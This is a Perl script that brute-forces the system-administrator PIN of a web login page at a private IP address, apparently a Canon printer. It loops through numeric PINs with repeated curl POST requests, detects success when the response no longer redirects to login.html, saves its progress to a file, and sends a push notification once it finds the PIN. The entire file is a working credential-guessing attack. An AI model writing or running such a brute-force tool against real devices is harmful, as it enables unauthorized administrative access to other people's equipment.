#!/usr/bin/env perl

use strict;
use warnings;

use Cwd;
use Data::Dumper;

my $base_url = "http://10.10.0.6";
my $url = "$base_url/tryLogin.cgi";

my $radio_name = "0000";
my $radio_value = "0010";

my $pin_name = "0001";

my $headers_outfile = "server-headers.txt";
my $data_outfile = "html-output.txt";

my $cwd = getcwd();

my $pin_save_file = "$cwd/canon-pin-save-file.txt";

sub save_pin {
    my $pin = shift;

    open(OUT, ">>$pin_save_file") || die "Can't write to $pin_save_file";
    my $d = `date`;
    chomp($d);
    print OUT "$d $pin\n";
    close(OUT);
}

my $pin = 38000;

# 0000: radio field for system or user login
# 0010: value for system
# 0001: text field for pin
my @argv;
push(@argv, "curl");
push(@argv, "--silent");
push(@argv, "--data");
my $post_data_base = "loginM=&0000=0010&0001=";
push(@argv, "to-be-replaced");
push(@argv, $url);
push(@argv, "-D");
push(@argv, $headers_outfile);
push(@argv, "-o");
push(@argv, $data_outfile);

while ($pin <= 9999999) {
    print "Trying PIN $pin...\n"
        if ($pin % 100 == 0);

    save_pin($pin)
        if ($pin % 1000 == 0);

    unlink($headers_outfile);
    $argv[3] = "${post_data_base}$pin";
    system(@argv);

    my $found = 0;
    open(IN, $headers_outfile) || die "Can't open $headers_outfile";
    while (<IN>) {
        if (/login\.html/) {
            $found = 1;
            last;
        }
    }
    close(IN);

    # Switched to this method at 38000
    if (!$found) {
        print "PIN winner: $pin\n";
        save_pin($pin);
        system("$ENV{HOME}/dotfiles/pushover pin: $pin");
        exit(0);
    }

    ++$pin;
}
